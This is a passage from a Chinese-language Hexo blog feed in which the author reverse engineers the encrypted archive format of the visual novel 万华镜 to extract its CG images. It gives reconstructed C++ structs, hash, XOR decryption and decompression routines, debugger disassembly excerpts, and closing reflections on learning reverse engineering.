class="line">            <span class="keyword">if</span> (<span class="built_in">wcsncmp</span>(name, <span class="string">L&quot;pack_keyfile_kfueheish15538fa9or.key&quot;</span>, character_count) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                keyfilehash = <span class="built_in">dencypt4_keyfilehash</span>(filedata, fentry-&gt;size);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(fentry-&gt;EncryptType == <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            filehash = <span class="built_in">dencrypt4_hash</span>(<span class="number">0x40</span>, fentry-&gt;size, name, character_count, hash);</span><br><span class="line">            <span class="built_in">dencrypt4</span>(filedata, fentry-&gt;size, filehash, keyfilehash);</span><br><span class="line">        &#125;</span><br><span class="line">        Dencrypt2DataOutput* Output = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span> (fentry-&gt;isCompressed)</span><br><span class="line">        &#123;</span><br><span class="line">            Output = <span class="built_in">dencrypt2</span>(filedata, fentry-&gt;size, fentry-&gt;dencrypted_size, hash);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            Output = <span class="keyword">new</span> <span class="built_in">Dencrypt2DataOutput</span>();</span><br><span class="line">            Output-&gt;data = (BYTE*)filedata;</span><br><span class="line">            Output-&gt;len = fentry-&gt;dencrypted_size;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//保存文件</span></span><br><span class="line">        wstring filename = <span class="built_in">wstring</span>(name);</span><br><span class="line">        filename = <span class="string">L&quot;ExtractData\\&quot;</span> + filename;</span><br><span class="line">        FILE* hOut = <span class="built_in">WideChar_CreateFile</span>(filename.<span class="built_in">c_str</span>());</span><br><span class="line">        std::<span class="built_in">fwrite</span>(Output-&gt;data, Output-&gt;len, <span class="number">1</span>, hOut);</span><br><span class="line">        std::<span class="built_in">fclose</span>(hOut);</span><br><span class="line">        <span class="keyword">delete</span> fentry, name, filedata, filehash, Output;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    std::<span class="built_in">fclose</span>(hfile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>52pj那篇神作对于没接触过这种类型的逆向来说还是挺有难度的 无论是x32dbg的调试技巧还是一些数据敏感以及对结构体的重视都需要时间来适应<br>希望我的工作能给看到这篇文章的你带来一点启发</p><p>可以说万华镜是我最早接触到逆向工程的一个契机<br>去年暑假找万华镜玩的时候想要解出里面的CG 网上的Extractor都解不出来<br>兜兜转转就找到了52pj这篇神作~<br>去年11月初也尝试过开始逆 但逆不了一点…<br>现在又过了几个月 又学习到了更多知识&#x2F;逆向经验 磕磕绊绊也能将引擎摸索个大概<br>犹记几个月前还将逆出万华镜5作为逆向的终极目标(🤣) 看来目标还可以更大呐~</p><p>也许这就是逆向工程的魅力所在吧~ 能让我花整整一个周末 一直做一件事<br>当跟着一条条汇编抽丝剥茧 还原各种结构体 找到各个关键算法时 那种喜悦是难以言表的<br>希望能一直带着这种热忱继续学习逆向工程 </p><p><strong><code>&lt;&lt;&lt; Reversing &lt;&lt;&lt;</code></strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>万华镜逆向(初试)</title>
      <link href="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/"/>
      <url>/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/</url>
      
        <content type="html"><![CDATA[<h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><p><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-1.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-2.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-3.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-4.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-5.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-6.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-7.png" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Struct FilePackVer</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> sign[<span class="number">0x10</span>];</span><br><span class="line">    DWORD size?;</span><br><span class="line">    DWORD entry?;</span><br><span class="line">    DWORD unknown;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-8.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-9.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-10.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-11.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-12.png" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">Tohash</span><span class="params">(<span class="type">void</span>* data, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//准备工作</span></span><br><span class="line">    __m64 mm0 = _mm_cvtsi32_si64(<span class="number">0</span>);</span><br><span class="line">    __m64 mm1;</span><br><span class="line">    __m64 mm2 = _mm_cvtsi32_si64(<span class="number">0</span>);</span><br><span class="line">    DWORD key = <span class="number">0xA35793A7</span>;</span><br><span class="line">    __m64 mm3 = _mm_cvtsi32_si64(key);</span><br><span class="line">     mm3 = _m_punpckldq(mm3, mm3);</span><br><span class="line">     __m64* pdata=(__m64*)data;</span><br><span class="line">    <span class="comment">//开始循环计算hash</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; (len &gt;&gt; <span class="number">3</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        mm1 = *pdata;</span><br><span class="line">        pdata++;</span><br><span class="line">        mm2 = _m_paddw(mm2, mm3);</span><br><span class="line">        mm1 = _m_pxor(mm1, mm2);</span><br><span class="line">        mm0 = _m_paddw(mm0, mm1);</span><br><span class="line">        mm1 = mm0;</span><br><span class="line">        mm0 = _m_pslldi(mm0, <span class="number">3</span>);</span><br><span class="line">        mm1 = _m_psrldi(mm1, <span class="number">0x1D</span>);</span><br><span class="line">        mm0 = _m_por(mm1, mm0);</span><br><span class="line">    &#125;</span><br><span class="line">    mm1 = _m_psrlqi(mm0, <span class="number">32</span>);</span><br><span class="line">    DWORD result = _mm_cvtsi64_si32(_m_pmaddwd(mm0, mm1));</span><br><span class="line">    _m_empty();<span class="comment">//复位浮点寄存器</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-13.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-14.png" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dencrypt</span><span class="params">(<span class="type">void</span>* data,<span class="type">unsigned</span> <span class="type">int</span> len, DWORD hash)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &gt;&gt; <span class="number">3</span> == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//准备工作</span></span><br><span class="line">    DWORD key1 = <span class="number">0xA73C5F9D</span>;</span><br><span class="line">    DWORD key2 = <span class="number">0xCE24F523</span>;</span><br><span class="line">    DWORD key3 = (len + hash)^ <span class="number">0xFEC9753E</span>;</span><br><span class="line">    __m64 mm7 = _mm_cvtsi32_si64(key1);</span><br><span class="line">    mm7 = _m_punpckldq(mm7, mm7);</span><br><span class="line">    __m64 mm6 = _mm_cvtsi32_si64(key2);</span><br><span class="line">    mm6 = _m_punpckldq(mm6, mm6);</span><br><span class="line">    __m64 mm5 = _mm_cvtsi32_si64(key3);</span><br><span class="line">    mm5 = _m_punpckldq(mm5, mm5);</span><br><span class="line">    __m64* datapos = (__m64*)data;</span><br><span class="line">    __m64 mm0;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len &gt;&gt; <span class="number">3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        mm7 = _m_paddd(mm7, mm6);</span><br><span class="line">        mm7 = _m_pxor(mm7, mm5);</span><br><span class="line">        mm0 = *datapos;</span><br><span class="line">        mm0 = _m_pxor(mm0, mm7);</span><br><span class="line">        mm5 = mm0;</span><br><span class="line">        *datapos = mm0;</span><br><span class="line">        datapos++;</span><br><span class="line">    &#125;</span><br><span class="line">    _m_empty();<span class="comment">//复位浮点寄存器</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-15.png" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">004</span>ED95B         | <span class="number">8</span>D85 B4FBFFFF   | lea eax,dword ptr ss:[ebp<span class="number">-0x44C</span>]                   | 缓冲区</span><br><span class="line"><span class="number">004</span>ED961         | <span class="number">8</span>D95 B8FBFFFF   | lea edx,dword ptr ss:[ebp<span class="number">-0x448</span>]                   | 需要转换的字符串</span><br><span class="line"><span class="number">004</span>ED967         | B9 <span class="number">20000000</span>     | mov ecx,<span class="number">0x20</span>                                       | 字符串长度</span><br><span class="line"><span class="number">004</span>ED96C         | E8 <span class="number">9F</span>9EF1FF     | call &lt;月に寄りそう乙女の作法<span class="number">22.</span>multibyte2widecode&gt;            | 字符转unicode</span><br><span class="line"><span class="number">004</span>ED971         | <span class="number">8B</span>85 B4FBFFFF   | mov eax,dword ptr ss:[ebp<span class="number">-0x44C</span>]                   |</span><br><span class="line"><span class="number">004</span>ED977         | BA <span class="number">28</span>DB4E00     | mov edx,月に寄りそう乙女の作法<span class="number">22.4</span>EDB28                       | <span class="number">4</span>EDB28:<span class="string">L&quot;8hr48uky,8ugi8ewra4g8d5vbf5hb5s6&quot;</span></span><br><span class="line"><span class="number">004</span>ED97C         | E8 <span class="number">7F</span>A3F1FF     | call &lt;月に寄りそう乙女の作法<span class="number">22.</span>cmp_sign&gt;                      | 比对签名</span><br></pre></td></tr></table></figure><p><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-16.png" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">FilePackVer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> sign[<span class="number">0x10</span>];</span><br><span class="line">    DWORD size?;</span><br><span class="line">    QWORD entry?; <span class="comment">//写程序的时候需要变成两个int型表示低位和高位，直接用64位整型读取文件的时候会少读这部分数据</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-17.png" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">HashData</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> sign[<span class="number">0x20</span>];</span><br><span class="line">    DWORD HashVerSize;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x100</span>];</span><br><span class="line">    DWORD Unkown; <span class="comment">//就是那个大于8或者小于0就设置成0的数据</span></span><br><span class="line">    <span class="type">char</span> Blank[<span class="number">0x2F8</span>]; <span class="comment">//一大片用0填充的数据，应该是用于占位</span></span><br><span class="line">    FilePackVer fpacker;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-18.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004ED9D2         | E8 397DF1FF     | call 月に寄りそう乙女の作法22.405710                          | 构造类？</span><br></pre></td></tr></table></figure><p><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-19.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-20.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-21.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-22.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-23.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-24.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-25.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-26.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-27.png" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chr是逐个从数据中取出的字节，t_pos是表的下标</span></span><br><span class="line"><span class="comment">//这里有两张表，一张是table，刚刚从0-FF复制过来的，另一张是other，不做任何预处理</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chr &gt; <span class="number">0x7F</span>u)</span><br><span class="line">    &#123;</span><br><span class="line">        t_pos += chr - <span class="number">127</span>;</span><br><span class="line">        chr = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (t_pos &gt; <span class="number">0xFF</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; chr + <span class="number">1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        table[t_pos] = *datapos++;</span><br><span class="line">        <span class="keyword">if</span> (t_pos != (<span class="type">unsigned</span> __int8)table[t_pos])</span><br><span class="line">        &#123;</span><br><span class="line">            other[t_pos] = *datapos++;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        ++t_pos;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (t_pos &gt; <span class="number">0xFF</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    chr = *datapos++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-28.png" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Dencrypt2DataOutput* <span class="title">dencrypt2</span><span class="params">(<span class="type">void</span>* data, <span class="type">unsigned</span> <span class="type">int</span> len,<span class="type">unsigned</span> <span class="type">int</span> dencrypted_len, DWORD hash)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> Sampletable[<span class="number">0x100</span>],table[<span class="number">0x100</span>],other[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Sampletable[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    Dencrypt2DataHead* head = (Dencrypt2DataHead*)data;</span><br><span class="line">    <span class="comment">//对比开头是否为0xFF425031</span></span><br><span class="line">    <span class="keyword">if</span> (head-&gt;sign != <span class="number">0xFF435031</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;数据不符合解码条件&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (head-&gt;size&gt; <span class="number">0x20000000</span>u)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;数据量大于0x20000000&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    Dencrypt2DataOutput* Output = <span class="keyword">new</span> <span class="built_in">Dencrypt2DataOutput</span>();</span><br><span class="line">    Output-&gt;len = dencrypted_len;</span><br><span class="line">    Output-&gt;data = <span class="keyword">new</span> BYTE[dencrypted_len + <span class="number">1</span>];</span><br><span class="line">    BYTE* outputbuff = Output-&gt;data;</span><br><span class="line">  </span><br><span class="line">    BYTE* datapos = (BYTE*)data + <span class="built_in">sizeof</span>(Dencrypt2DataHead);</span><br><span class="line">    BYTE* data_start = datapos;</span><br><span class="line">    BYTE* data_end = (BYTE*)data + len;</span><br><span class="line">    BYTE chr;</span><br><span class="line">    <span class="type">int</span> t_pos;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="keyword">while</span> (data_start &lt; data_end)</span><br><span class="line">    &#123;</span><br><span class="line">        chr = *data_start;</span><br><span class="line">        datapos = data_start + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">memcpy</span>(table, Sampletable, <span class="number">0x100</span>);</span><br><span class="line">        t_pos = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//建表循环</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (chr &gt; <span class="number">0x7F</span>u)</span><br><span class="line">            &#123;</span><br><span class="line">                t_pos += chr - <span class="number">127</span>;</span><br><span class="line">                chr = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (t_pos &gt; <span class="number">0xFF</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">  </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; chr + <span class="number">1</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                table[t_pos] = *datapos++;</span><br><span class="line">                <span class="keyword">if</span> (t_pos != (<span class="type">unsigned</span> __int8)table[t_pos])</span><br><span class="line">                &#123;</span><br><span class="line">                    other[t_pos] = *datapos++;</span><br><span class="line">                &#125;</span><br><span class="line">  </span><br><span class="line">                ++t_pos;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (t_pos &gt; <span class="number">0xFF</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            chr = *datapos++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//数据类型判断</span></span><br><span class="line">        <span class="keyword">if</span> ((head-&gt;isWordType &amp; <span class="number">1</span>) == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            size = *(WORD*)datapos;</span><br><span class="line">            data_start = (datapos + <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            size = *(DWORD*)datapos;</span><br><span class="line">            data_start = (datapos + <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//解密循环</span></span><br><span class="line">        stack&lt;BYTE&gt; stack;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            BYTE result;</span><br><span class="line">            <span class="keyword">if</span> (stack.<span class="built_in">size</span>())</span><br><span class="line">            &#123;</span><br><span class="line">                result = stack.<span class="built_in">top</span>();</span><br><span class="line">                stack.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!size)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                size--;</span><br><span class="line">                result = *data_start;</span><br><span class="line">                data_start++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (result == (BYTE)table[result])</span><br><span class="line">            &#123;</span><br><span class="line">                *outputbuff = result;</span><br><span class="line">                outputbuff++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                stack.<span class="built_in">push</span>(other[result]);</span><br><span class="line">                stack.<span class="built_in">push</span>(table[result]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-29.png" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HashVer </span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> sign[<span class="number">16</span>];</span><br><span class="line">        DWORD  table_size;</span><br><span class="line">    DWORD  file_count;</span><br><span class="line">    DWORD  index_size;</span><br><span class="line">    DWORD  data_size;</span><br><span class="line">    DWORD  iscompressed;</span><br><span class="line">    <span class="type">char</span> unknown1[<span class="number">32</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-30.png" 